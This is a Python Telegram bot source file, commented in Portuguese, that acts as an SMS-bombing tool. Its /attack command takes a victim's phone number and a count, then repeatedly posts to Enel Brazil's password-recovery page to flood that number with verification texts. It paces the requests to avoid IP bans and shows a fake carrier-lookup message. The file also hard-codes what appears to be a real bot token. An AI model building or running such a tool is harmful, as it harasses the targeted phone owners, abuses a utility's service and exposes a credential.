import telebot
import requests
import threading
import time

# --- CONFIGURAÇÕES ---
TOKEN = "8678290317:AAHrFP3IXWtreQhumMgAn9642HcTPTof8tI"
bot = telebot.TeleBot(TOKEN)

# APIs Genéricas (Backup)
API_LIST = []

# Dicionário de operadoras
OPERADORAS = {
    "11": {"11": "Vivo", "15": "Claro", "17": "Tim", "19": "Oi"},
    "21": {"21": "Vivo", "24": "Claro", "27": "Tim", "28": "Oi"},
}

def get_operator(phone):
    phone = "".join(filter(str.isdigit, phone))
    if len(phone) < 10: return "Desconhecida"
    ddd = phone[2:4] if phone.startswith("55") else phone[0:2]
    prefix = phone[4:6] if phone.startswith("55") else phone[2:4]
    try:
        return OPERADORAS.get(ddd, {}).get(prefix, "Operadora Brasileira")
    except:
        return "Operadora Brasileira"

# --- MÓDULO ESPECÍFICO ENEL ---
def send_enel_sms(phone):
    """Tenta disparar SMS via endpoint de recuperação da Enel"""
    # A Enel geralmente exige o número no formato 55DD9XXXXXXXX
    url = "https://www.enel.com.br/pt/servico/RecuperarSenha/nova-senha.html?utm_source=chatgpt.com"
    # Simulando a requisição de disparo de código
    payload = {
        "celular": phone,
        "phone": phone,
        "numero": phone,
        "action": "send_code"
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://www.enel.com.br/'
    }
    try:
        # Tentamos POST pois é o padrão de formulários de senha
        res = requests.post(url, data=payload, headers=headers, timeout=5)
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def attack_loop(phone, count, chat_id):
    success = 0
    fail = 0
    
    for i in range(count):
        # 1. Tenta a munição da Enel (Prioridade)
        if send_enel_sms(phone):
            success += 1
        else:
            fail += 1
            
            pass
        time.sleep(0.7) # Delay para evitar ban de IP no Render
    
    bot.send_message(chat_id, f"✅ Ataque Finalizado!\n\nSucessos: {success}\nFalhas: {fail}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Bot de Stress SMS Ativo.\nUse: /attack [numero] [quantidade]\nExemplo: /attack 5511999999999 50")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    try:
        args = message.text.split()
        phone = args[1]
        count = int(args[2])
        
        op = get_operator(phone)
        
        bot.reply_to(message, f"🔍 Consultando número {phone}...")
        time.sleep(1.5)
        bot.send_message(message.chat.id, f"🎯 Número Encontrado!\n📱 Operadora: {op}\n📍 Status: Ativo")
        time.sleep(1)
        
        bot.send_message(message.chat.id, f"🚀 Iniciando ataque com módulo ENEL...\nQuantidade: {count} ciclos.")
        
        threading.Thread(target=attack_loop, args=(phone, count, message.chat.id)).start()
        
    except Exception as e:
        bot.reply_to(message, "❌ Erro! Use o formato: /attack 5511999999999 50")

print("Bot rodando com Módulo Enel...")
bot.infinity_polling()
